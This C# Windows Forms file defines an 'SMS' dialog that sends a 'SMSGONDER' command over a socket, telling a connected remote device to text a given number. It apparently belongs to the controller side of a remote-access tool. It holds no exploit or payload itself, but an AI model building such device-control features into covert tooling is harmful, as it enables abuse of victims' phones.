using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace SV
{
    public partial class SMS : Form
    {
        Socket s;
        public SMS(Socket socket, string num)
        {
            InitializeComponent();
            s = socket;
            textBox1.Text = num;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text != "" && textBox2.Text != "")
            {
                try
                {
                    Form1.KomutGonder("SMSGONDER", "[VERI]" + textBox1.Text + "=" + textBox2.Text + "=[VERI][0x09]", s);
                    MessageBox.Show("SMS was sent.", "SMS", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception) { }
            }
        }
    }
}
